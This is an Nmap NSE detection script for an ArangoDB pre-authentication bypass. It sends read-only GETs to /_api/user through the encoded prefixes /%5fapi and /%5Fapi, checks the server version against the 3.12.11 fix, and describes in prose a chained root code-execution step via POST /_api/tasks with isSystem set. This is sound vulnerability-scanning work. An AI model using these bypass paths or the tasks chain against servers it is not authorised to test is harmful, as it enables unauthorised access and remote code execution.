local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Detects ArangoDB servers vulnerable to the pre-authentication _api access-control
bypass (GHSA-rrgq-978q-36mq, CVSS 9.8), fixed in 3.12.11.

The authorization gate reads the RAW request path while the router reads the
DECODED path, so a request to /%5fapi/... (%5f = "_") is treated as an
unauthenticated public path but is routed to the privileged /_api/... handler.

Safe active check: the script sends an unauthenticated GET to a READ-ONLY,
auth-required endpoint (/_api/user) both raw (/_api/user) and encoded
(/%5fapi/user). A patched or secured server answers the encoded path with 401.
A vulnerable server bypasses the gate, reaches the handler, and answers with a
non-401 ArangoDB-shaped response. Nothing is created, modified, or deleted, and
the script does not print any data the bypass may return.

Passive corroboration: if /_api/version is reachable, the reported version is
compared against the 3.12.11 fix line so a TLS- or proxy-blocked instance can
still be flagged by version.

Chained impact (NOT probed): past the gate, a DB-write user can POST /_api/tasks
with "isSystem": true to gain root RCE (GHSA-rvhw-4hpw-9vrx, CVSS 9.9).

Fix: upgrade to ArangoDB 3.12.11 or later.
]]

author = "synthetic-detections"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.port_or_service({8529}, {"arangodb", "http"}, "tcp")

-- Per-request options; timeout keeps large sweeps from hanging on a dead host.
local TIMEOUT = 7000

local function req(host, port, method, path, scheme, auth_header)
  local hdr = {}
  if auth_header then hdr["Authorization"] = auth_header end
  return http.generic_request(host, port, method, path, {
    header = hdr,
    scheme = scheme,
    timeout = TIMEOUT,
    no_cache = true,
    redirect_ok = false,
  })
end

-- Is the response body/headers shaped like an ArangoDB API answer?
local function looks_arango(resp)
  if not resp then return false end
  local srv = resp.header and (resp.header["server"] or "")
  if srv and srv:lower():find("arango") then return true end
  local b = resp.body or ""
  -- ArangoDB JSON answers carry errorNum/error/code; 1203 = collection not found.
  if b:find('"errorNum"') or b:find('"error"%s*:') or b:find('"code"%s*:%s*%d') then
    return true
  end
  return false
end

-- Compare dotted versions. Returns -1/0/1 for a<b / a==b / a>b.
local function vcmp(a, b)
  local function parts(v)
    local t = {}
    for n in tostring(v):gmatch("%d+") do t[#t + 1] = tonumber(n) end
    return t
  end
  local pa, pb = parts(a), parts(b)
  for i = 1, math.max(#pa, #pb) do
    local x, y = pa[i] or 0, pb[i] or 0
    if x ~= y then return x < y and -1 or 1 end
  end
  return 0
end

-- Verdict from a parsed version string against the 3.12.11 fix line.
local function version_verdict(ver)
  if not ver then return nil end
  -- Fixed line is 3.12.11+. Anything on 3.12.x below .11, or any older
  -- major/minor branch, predates the fix.
  if vcmp(ver, "3.12.11") < 0 then
    return "vulnerable-by-version"
  end
  return "patched-by-version"
end

-- Pick the scheme (http/https) that actually answers on this port.
local function probe_scheme(host, port)
  local order = shortport.ssl(host, port) and {"https", "http"} or {"http", "https"}
  for _, s in ipairs(order) do
    local r = http.get(host, port, "/_api/version", {
      scheme = s, timeout = TIMEOUT, no_cache = true, redirect_ok = false,
    })
    if r and (r.status or r.body) then
      return s, r
    end
  end
  return nil, nil
end

action = function(host, port)
  local out = stdnse.output_table()

  -- 0. Reach the server and identify ArangoDB.
  local scheme, ver_resp = probe_scheme(host, port)
  if not scheme then
    return nil  -- nothing answered on either scheme
  end

  local is_arango = looks_arango(ver_resp)
    or (ver_resp.body and ver_resp.body:lower():find("arango"))
  local parsed_version
  if ver_resp.body then
    parsed_version = ver_resp.body:match('"version"%s*:%s*"([%d%.%-%w]+)"')
  end
  if parsed_version then is_arango = true end
  if not is_arango then
    return nil  -- not ArangoDB
  end

  -- Read-only, auth-required probe endpoint. GET has no side effects.
  local PROBE = "/_api/user"
  local ENC   = "/%5fapi/user"   -- %5f = "_"
  local ENCUP = "/%5Fapi/user"   -- uppercase encoding, same bug
  local BOGUS = "Bearer this-is-not-a-token."  -- invalid token == unauthenticated

  -- 1. Baseline: does the RAW /_api path enforce auth?
  local raw = req(host, port, "GET", PROBE, scheme, nil)
  local raw_code = raw and raw.status or 0

  -- 2. Bypass: same endpoint via encoded prefix, unauthenticated.
  local byp = req(host, port, "GET", ENC, scheme, BOGUS)
  local byp_code = byp and byp.status or 0
  local byp_arango = looks_arango(byp)

  -- 3. Uppercase-encoding corroboration (only if the lowercase one was blocked).
  local bypup_code = 0
  local bypup_arango = false
  local lc_confirmed = (raw_code == 401 and byp_code ~= 401 and byp_code ~= 0 and byp_arango)
  if not lc_confirmed then
    local bypup = req(host, port, "GET", ENCUP, scheme, BOGUS)
    bypup_code = bypup and bypup.status or 0
    bypup_arango = looks_arango(bypup)
  end

  out.scheme = scheme
  if parsed_version then out.version = parsed_version end
  out.baseline_raw_api = tostring(raw_code) .. " on " .. PROBE
  out.bypass_encoded   = tostring(byp_code) .. " on " .. ENC
  if bypup_code ~= 0 then
    out.bypass_encoded_upper = tostring(bypup_code) .. " on " .. ENCUP
  end

  local vver = version_verdict(parsed_version)
  if vver then out.version_assessment = vver end

  -- VULNERABLE requires: raw path enforces auth (401), encoded path does NOT,
  -- AND the encoded response actually reached the ArangoDB handler (arango-shaped).
  -- The arango-shaped requirement rejects a fronting proxy that merely 404s the
  -- literal "%5fapi" path (which would otherwise read as a false positive).
  local enc_bypassed = (raw_code == 401)
    and (byp_code ~= 401 and byp_code ~= 0)
    and byp_arango
  local encup_bypassed = (raw_code == 401)
    and (bypup_code ~= 401 and bypup_code ~= 0)
    and bypup_arango

  if enc_bypassed or encup_bypassed then
    out.state = "VULNERABLE"
    out.detail = "pre-auth _api bypass confirmed: encoded prefix reached the ArangoDB handler without auth"
    out.reference = "GHSA-rrgq-978q-36mq (CVSS 9.8); chains to GHSA-rvhw-4hpw-9vrx (root RCE). Fix: ArangoDB 3.12.11+."
  elseif raw_code ~= 401 and raw_code ~= 0 then
    out.state = "LIKELY_NO_AUTH"
    out.detail = "server did not require auth on /_api even unencoded (HTTP " .. raw_code ..
                 ") -- authentication may be disabled; verify config"
    if vver == "vulnerable-by-version" then
      out.detail = out.detail .. "; reported version also predates the 3.12.11 fix"
    end
  elseif raw_code == 401 and byp_code ~= 401 and byp_code ~= 0 and not byp_arango then
    out.state = "INCONCLUSIVE"
    out.detail = "encoded path returned HTTP " .. byp_code ..
                 " but not an ArangoDB-shaped response -- likely a fronting proxy, not a live bypass"
    if vver then out.detail = out.detail .. "; version assessment: " .. vver end
  elseif vver == "vulnerable-by-version" then
    out.state = "VULNERABLE_BY_VERSION"
    out.detail = "active bypass probe was blocked (TLS/proxy or hardened endpoint) but the reported version " ..
                 tostring(parsed_version) .. " predates the 3.12.11 fix"
    out.reference = "GHSA-rrgq-978q-36mq / GHSA-rvhw-4hpw-9vrx. Fix: ArangoDB 3.12.11+."
  else
    out.state = "not vulnerable (patched, secured, or bypass blocked)"
  end

  return out
end
